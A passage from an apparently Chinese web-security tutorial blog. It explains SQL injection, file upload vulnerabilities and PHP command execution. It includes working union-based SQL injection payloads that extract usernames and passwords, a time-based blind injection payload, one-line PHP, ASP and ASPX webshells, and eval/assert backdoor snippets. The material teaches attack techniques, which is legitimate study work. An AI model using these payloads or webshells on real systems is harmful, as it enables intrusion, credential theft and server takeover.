务器，然后呈现给攻击者，<strong>攻击者由此获得数据库内的数据信息</strong>。</p></li><li><p>一次正常的HTTP请求分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823165930344.png" alt="image-20230823165930344"></p></li><li><p>一次正常的sql注入分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823165956400.png" alt="image-20230823165956400"></p></li></ol><h3 id="sql注入判断"><a href="#sql注入判断" class="headerlink" title="sql注入判断"></a>sql注入判断</h3><p>  根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，  说明存在注入漏洞。  </p><p><strong>俗话就是说，只要我们可以进行sql语句那么就存在漏洞</strong></p><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ol><li><p>按参数类型的分类</p><ul><li><p>数字型（没有引号闭合）  </p></li><li><p>字符型（双引号）  </p></li><li><p>搜索型（使用百分号）</p></li></ul></li><li><p>按数据库返回的结果分类</p><ul><li><p>回显注入  </p></li><li><p>报错注入  </p></li><li><p>盲注  </p><ul><li>基于布尔的盲注  </li><li>基于时间的盲注</li></ul></li></ul></li><li><p>按注入点位置分类</p><ul><li><p>GET注入  </p></li><li><p>POST注入  </p></li><li><p>Cookie注入 </p></li><li><p>Header注入</p></li></ul></li><li><p>详解</p><ul><li><p>按参数类型分类</p><p>  参数类型主要有两种：数字型、字符型。  </p><p>  在SQL查询语句中，数据库查询类型有以下三种：数字型、字符型、搜索型。  </p><ul><li><p>数字型</p><blockquote><p>SQL&#x3D; “select name from users where id&#x3D;1” 为典型的数字型注入  </p></blockquote><p>这种类型的注入参数为数字，在 users 表中查询用户输入的 id 值相对应的 name 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">and逻辑测试：<br>and 1=1 sql语句： select name from users where id=1 and 1=1<br>and 1=2 sql语句： select name from users where id=1 and 1=2<br>通过比较页面的变化判断输入是否被带入数据库执行<br><br></code></pre></td></tr></table></figure><p>有可能在执行1&#x3D;2的时候会报错，下面是具体的演示，请注意url的变化</p><p>当我输入</p><blockquote><p>?id&#x3D;1’ and 1&#x3D;2 –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823171333802.png" alt="image-20230823171333802"></p><p>当我输入</p><blockquote><p>?id&#x3D;1’ and 1&#x3D;1 –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823171534833.png" alt="image-20230823171534833"></p><p>会发现，网站执行了我们输入的 and ……这种附加的mysql语句，所以存在漏洞，当然不同的类型检查原理都一样，只是输入的参数不一样，我们这里输入的是<code>&#39;</code>,由此可见这是字符型</p></li><li><p>字符型</p><blockquote><p>SQL&#x3D;”select name from users where id&#x3D;’1’ “</p></blockquote><p>  字符型与数字型的不同：注入参数被引号包裹。  构造参数传递：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 and 1=1<br>SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;<br>1&#x27; and &#x27;1&#x27;=&#x27;1<br>SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;<br>1&#x27; and 1=1 #<br>SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;<br>1&#x27; and 1=2 #<br>SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27;<br><br></code></pre></td></tr></table></figure></li><li><p>搜索型 </p><blockquote><p>  SQL&#x3D; “select * from users  where name like ‘%tom%’ “  </p></blockquote><p>只是换了一个符号</p><p>搜索型与字符型相比多了一对 % </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 and 1=1<br>SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;<br>这个输入显然会报错误。<br>1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1<br>SQL查询语句：select * from users where name like &#x27;%tom%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;<br>这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。<br></code></pre></td></tr></table></figure><p>  注意： %  的URL编码为 %25 ，空格 “ “ 的URL编码为 %20，如果发现没有我们输入的 %  ，则我们可  以手工添加编码 %25。</p></li></ul></li><li><p>按数据库返回结果分类</p><ul><li><p>回显注入</p><p>在注入点的当前页面中获取返回结果。  </p><p>常用SQL注入测试代码：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1 or 1=1<br>1&#x27; or &#x27;1=1<br>1&#x27; or &#x27;1=2<br></code></pre></td></tr></table></figure><p>代码原理：利用逻辑运算符or 的运算原理，只要其中一个条件满足为真，则为真，而1&#x3D;1恒等式恒为  真，因此如果上面三个代码输入之后页面显示结果都为正常，则我们可以判断此页面存在SQL注入漏  洞  </p></li><li><p>报错注入</p><p>  程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以通过构  造一些报错语句从数据库返回并显示的错误信息中获取想要的结果。  </p><p>  在SQLServer中通常错误的查询会返回一些错误信息，在mysql中正常情况下是没有错误信息返回  </p><p>  的，但可以通过其他的方式进行错误信息的提取。  </p></li><li><p>盲注</p><p>  由于程序后端限制数据库返回错误信息，因此查询错误或没有结果时是没有信息返回的，可以通过数  据库的查询逻辑和延时函数来对注入的结果进行判断。  </p><p>  根据注入表现形式的不同，盲注又分为Based  boolean和Based time两种类型。  </p><p>Based boolean：基于布尔的盲注，其主要表现特征有：</p><ul><li><p>一是无报错信息返回；  </p></li><li><p>二是无论输入是正确还是错误，都只会显示两种情况（1 或 0）(ture 或 false)；  </p></li><li><p>三是在输入正确时，可通过输入 and 1&#x3D;1、and 1&#x3D;2 判断。  </p><p>Based time：基于Boolean的盲注可以在页面上看到正确或错误的回显，但是基于time的盲注是看不到  的。  </p><p>判断：通过”时间”条件进行特定的输入，判断后台执行SQL语句的时间来判断是否存在盲注。  比如 m’ and sleep(5) # 语句，通过页面显示的时间来判断是否存在基于时间的盲注。  可以通过在mysql语句中使用if构造查询语句。</p></li></ul><blockquote><p>  m’ <strong>and if</strong> ((substr((select database()),1,1))&#x3D;’a’,sleep(5),null) <strong>#</strong>  </p></blockquote><p>  通过substr对查询到的database()结果截取第一位的值，判断其否等于a，如果等于则判断为真，执行  sleep(5),如果不等于则判断为假，则null, 然后通过sleep(5)执行后的时间来确认所查询的值是否正确，  遍历出所有的值。</p></li></ul></li><li><p>按注入的位置分类  </p><p>  HTTP 定义了与服务器交互的不同方法，其中最基本的方法就是  GET 和  POST 。  <strong>GET</strong> 方式在客户端通过 URL 提交数据，数据在 URL 中可以看到；  </p><p><strong>POST</strong> 方式，数据放置在 Body 内提交，数据在 URL 中看不到。</p></li></ul></li></ol><h3 id="sql注入利用"><a href="#sql注入利用" class="headerlink" title="sql注入利用"></a>sql注入利用</h3><p>显错注入的流程</p><blockquote><p>01、获取字段数   <strong>order by</strong> x  </p><p>02、获取显示位  <strong>union select</strong> 1,2,3,4……  </p><p>03、获取数据库信息     version()，<strong>user</strong>()，@@datadir  </p><p>04、获取当前数据库    <strong>database</strong>()， <strong>schema</strong>()  </p><p>05、获取所有数据库  </p><p>06、获取数据库表  </p><p>07、获取所有字段  </p><p>08、获取数据  </p></blockquote><ul><li><p>判断是否存在sql的漏洞和存在什么形式的漏洞</p><blockquote><p>?id&#x3D;1’</p></blockquote><p>使用<code>&#39;</code>发现存在是字符型，接下来检查是否存在漏洞，使用and 1&#x3D;1</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211411271.png" alt="image-20230823211411271"></p><p>上面是使用 and 1&#x3D;1 的结果，避免字符型的，只读前面造成的正确却访问接下来来看and 1&#x3D;2</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211441010.png" alt="image-20230823211441010"></p><p>已经出现了错误，说明执行了我们插入了语句，存在漏洞</p></li><li><p>获取字段数</p><p>使用order by x进行判断当前的数据库有几行数据</p><p>建议这里可以使用脚本跑</p></li><li><p>获取显示位</p><p>由于我们传入的</p><blockquote><p>?id&#x3D;1</p></blockquote><p>会进行显示，所以我们让我们传入的id 不显示</p><blockquote><p>? id&#x3D;-1’ union select 1,2,3 –+</p></blockquote><p><code>--+</code>用于注释多出来的<code>&#39;</code></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823211947605.png" alt="image-20230823211947605"></p><p>可以发现2,3经行输出了，所以我们，针对2，3显示，显示我们想要查到的数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823212149811.png" alt="image-20230823212149811"></p><p>得到了数据库的拥有者，和当前的数据库版本</p></li><li><p>获取当前的数据库</p><blockquote><p>?id&#x3D;-1’ union select 1,database(),3–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823212646244.png" alt="image-20230823212646244"></p></li><li><p>查看所有的数据库</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823213844804.png" alt="image-20230823213844804"></p></li><li><p>查找某一个表的信息</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823215104388.png" alt="image-20230823215104388"></p></li><li><p>获取表中的所有字段</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;”users” –+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823215745818.png" alt="image-20230823215745818"></p></li><li><p>获取数据</p><blockquote><p>?id&#x3D;-1’ union select 1,group_concat(username),group_concat(password)  from users–+</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823220144076.png" alt="image-20230823220144076"></p><p>得到用户和密码，完成漏洞的挖掘</p></li></ul><h3 id="others知识点"><a href="#others知识点" class="headerlink" title="others知识点"></a>others知识点</h3><p>  concat、concat_ws、group_concat 区别  </p><ol><li><p>concat</p><ul><li><p>作用：将多个字符串连接在一起</p></li><li><p>语法：concat(str1,str2,…)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823220918700.png" alt="image-20230823220918700"></p></li></ul></li><li><p>concat_ws</p><ul><li><p>作用：  和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就  是concat with separator）  </p></li><li><p>语法：concat_ws(separator, str1, str2, …)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/sql%E6%B3%A8%E5%85%A5/image-20230823221124017.png" alt="image-20230823221124017"></p></li></ul></li><li><p>group_concat</p><ul><li>作用：  将group by产生的同一个分组中的值连接起来，返回一个字符串结果。  </li><li>语法：group_concat(  [distinct] 要连接的字段  [order by 排序字段 asc&#x2F;desc  ]  [separator ‘分隔符’] )</li></ul></li></ol><h2 id="web安全-文件上传"><a href="#web安全-文件上传" class="headerlink" title="web安全-文件上传"></a>web安全-文件上传</h2><h3 id="什么是文件上传"><a href="#什么是文件上传" class="headerlink" title="什么是文件上传"></a>什么是文件上传</h3><p>  将客户端数据以文件形式封装，通过网络协议发送到服务器端。在服务器端解析数据，最终在服务端  硬盘上作为真实的文件保存。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824172423642.png" alt="image-20230824172423642"></p><p>  通常一个文件以HTTP协议进行上传时，将以<em><strong>POST</strong></em>请求发送至Web服务器，Web服务器收到请求并同  意后，用户与Web服务器将建立连接，并传输数据。  </p><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>  <strong>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的  能力</strong>。这种攻击方式是最为直接和有效的，”文件上传”本身没有问题，有问题的是文件上传后，服务  器怎么处理、解释文件。如果服务器端脚本语言未对上传的文件进行严格的验证和过滤，就容易造成  上传任意文件的情况。  </p><p>  通常 Web 站点会有用户注册功能，<strong>而当用户登录之后大多数情况下会存在类似头像上传、附件上传之  类的功能</strong>，这些功能点往往存在上传验证方式不严格的安全缺陷，导致攻击者通过各种手段绕过验  证，上传非法文件，这是在web渗透中非常关键的突破口。  </p><h3 id="文件上传检测方式"><a href="#文件上传检测方式" class="headerlink" title="文件上传检测方式"></a>文件上传检测方式</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824173033394.png" alt="image-20230824173033394"></p><h3 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h3><p>  WebShell就是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种命令执行环境，也可以将其称之  为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目  录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控  </p><p>制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）</p><h4 id="常用的一句话webshell"><a href="#常用的一句话webshell" class="headerlink" title="常用的一句话webshell"></a>常用的一句话webshell</h4><blockquote><p>  php一句话木马： <strong><?php** @**eval**($_POST[value]);**?></strong>  </p><p>asp一句话木马： &lt;%**eval** **request**(“value”)%&gt;  </p><p>aspx一句话木马： &lt;%@  Page Language&#x3D;”Jscript”%&gt;&lt;%**eval**(Request.Item[“value”])%&gt;  </p></blockquote><p>  制作一句话图片马：copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg  </p><h3 id="webshell原理"><a href="#webshell原理" class="headerlink" title="webshell原理"></a>webshell原理</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php的代理需要写在<?php ?>里面</p><p>@是不要报错</p><p>  php里面有几个超全局变量，$ _GET、$ _POST就是其中之一，意思是用 post 的方法接收变量  cmd传递来的字符。  </p><p><code>eval()</code>把字符作为php执行</p><p><code>exec()</code>执行外部的命令，并且返回结果</p><p><code>system()</code>执行系统的命令</p><h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><h4 id="绕过客户端检测-JS检测"><a href="#绕过客户端检测-JS检测" class="headerlink" title="绕过客户端检测(JS检测)"></a>绕过客户端检测(JS检测)</h4><p>  原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和  </p><p>  扩展名是否合法。  </p><p>  方法：在本地浏览器客户端禁用JS即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实  </p><p>现，利用burpsuite可以绕过一切客户端检测。</p><h4 id="绕过服务端检测"><a href="#绕过服务端检测" class="headerlink" title="绕过服务端检测"></a>绕过服务端检测</h4><ol><li><p>服务端检测</p><p>  服务端的代码通常检测三个点：MIME类型、文件内容、文件后缀  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174352849.png" alt="image-20230824174352849"></p></li><li><p>绕过MIME类型检测</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174429113.png" alt="image-20230824174429113"></p><p>  原理：检测图片类型文件上传过程中http包的Content-Type字段的值，来判断上传文件是否合法。  方法：用burpsuite截取并修改数据包中文件的content-type类型进行绕过。  </p></li><li><p>绕过文件后缀检测-黑名单  </p><p>黑名单策略：</p></li></ol><p>   文件扩展名在黑名单中为不合法，一般有个专门的黑名单列表，里面会包含常见的危险脚本文件。</p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174532010.png" alt="image-20230824174532010"></p><ul><li><p>后缀大小写绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174606203.png" alt="image-20230824174606203"></p></li></ul><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174709369.png" alt="image-20230824174709369"></p><h4 id="绕过文件后缀检测"><a href="#绕过文件后缀检测" class="headerlink" title="绕过文件后缀检测"></a>绕过文件后缀检测</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824174904343.png" alt="image-20230824174904343"></p><h4 id="绕过文件内容检测"><a href="#绕过文件内容检测" class="headerlink" title="绕过文件内容检测"></a>绕过文件内容检测</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175119627.png" alt="image-20230824175119627"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175154589.png" alt="image-20230824175154589"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175215369.png" alt="image-20230824175215369"></p><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175418574.png" alt="image-20230824175418574"></p><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175548147.png" alt="image-20230824175548147"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175602580.png" alt="image-20230824175602580"></p><h4 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175700733.png" alt="image-20230824175700733"></p><h4 id="IIS-7-0-x2F-7-5解析漏洞"><a href="#IIS-7-0-x2F-7-5解析漏洞" class="headerlink" title="IIS 7.0&#x2F;7.5解析漏洞"></a>IIS 7.0&#x2F;7.5解析漏洞</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230824175744058.png" alt="image-20230824175744058"></p><h2 id="web安全-命令执行"><a href="#web安全-命令执行" class="headerlink" title="web安全-命令执行"></a>web安全-命令执行</h2><h3 id="命令执行的漏洞简介"><a href="#命令执行的漏洞简介" class="headerlink" title="命令执行的漏洞简介"></a>命令执行的漏洞简介</h3><ol><li><p>原因</p><p>因为没有对用户输入没有严格的过滤，导致用户的输入当作命令</p></li><li><p>危害</p><ul><li><p>继承web服务器的权限去执行命令</p></li><li><p>反弹shell</p><p>获得目标服务器的权限</p></li><li><p>进一步内网渗透</p><p>可以远程执行代码</p><p>  因为业务需求，在PHP中有时需要调用一些执行命令的函数，如：**eval()、assert()、  preg_replace()、create_function()**等，如果存在一个使用这些函数且未对可被用户控制的参数  </p><p>进行检查过滤的页面，那么这个页面就可能存在远程代码执行漏洞。</p></li></ul></li></ol><h3 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h3><ol><li><p>eval()</p><p>把字符串作为代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> (<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  注意：eval() 函数传入的参数必须为PHP代码，即要以分号结尾；  </p><p>  函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供  的、未经完整验证过的数据 。  </p></li><li><p>assert()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> ] )<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>  检查一个断言是否为 FALSE  </p><p>注意：assert()函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾</p></li><li><p>call_user_func  ()</p></li></ol>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] )<br></code></pre></td></tr></table></figure>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-comment">//传入的参数作为assert函数的参数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><ol start="4"><li>call_user_func_array</li></ol>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func_array</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$param_arr</span> )<br></code></pre></td></tr></table></figure>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-comment">//将传入的参数作为数组的第一个值传递给assert函数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><pre><code class="hljs"> 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传  入。  </code></pre><p>   调用回调函数，并把一个数组参数作为回调函数的参数</p><h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>  一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们  常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界  面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。  而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶  意命令，让后台进行执行，从而获得后台服务器权限。  </p><p>  利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有 system()、exec()、shell_exec()、  passthru()、penti_exec()、popen()、proc_pen()等，此外还有反引号命令执行，这种方式实际上是调  用 shell_exec()函数来执行。  </p><h3 id="php系统命令执行函数"><a href="#php系统命令执行函数" class="headerlink" title="php系统命令执行函数"></a>php系统命令执行函数</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230825001713621.png" alt="image-20230825001713621"></p><p>php提供的专门执行外部命令的函数</p><blockquote><p>exec()</p><p>system()</p><p>passthru()</p><p>shell_exec()</p></blockquote><ol><li>exec  ()</li></ol>   